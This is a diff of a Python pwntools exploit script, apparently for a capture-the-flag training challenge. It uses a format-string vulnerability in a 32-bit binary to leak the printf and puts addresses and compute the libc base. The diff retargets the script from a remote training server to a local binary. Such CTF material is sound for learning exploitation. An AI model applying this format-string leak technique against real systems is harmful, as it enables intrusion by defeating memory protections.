@@ -6,12 +6,12 @@ context(arch='i386',os='linux')
 context.terminal=["tmux","splitw","-h"]
 
  #打印printf的got表
-elf =ELF("./easyFMT")
+elf =ELF("./pwn/string/fmt-5/fmt5")
 printf_got=elf.got['printf']
 log,info("printf_got: {0}".format(hex(printf_got)))
 
-# r=process('./easyFMT')
-r=remote("train2024.hitctf.cn",26356)
+r=process("./pwn/string/fmt-5/fmt5")
+# r=remote("train2024.hitctf.cn",26356)
 print(r.recvline())
 
 #利用格式化漏洞，泄漏出printf在libc中的真实地址
@@ -27,7 +27,8 @@ log,info("printf: {0}".format(hex(printf_address)))
 puts_address = u32(printf_str[8:12])
 log,info("puts: {0}".format(hex(puts_address)))
 
-libc=ELF('./libc6_2.35-0ubuntu3.4_i386.so')
+# libc=ELF('./pwn/string/fmt-5/libc6_2.35-0ubuntu3.4_i386.so')
+libc=ELF('/lib/i386-linux-gnu/libc.so.6')
 printf_offset=libc.symbols['printf']
 libc_address = printf_address-printf_offset
 log,info("libc: {0}".format(hex(libc_address)))
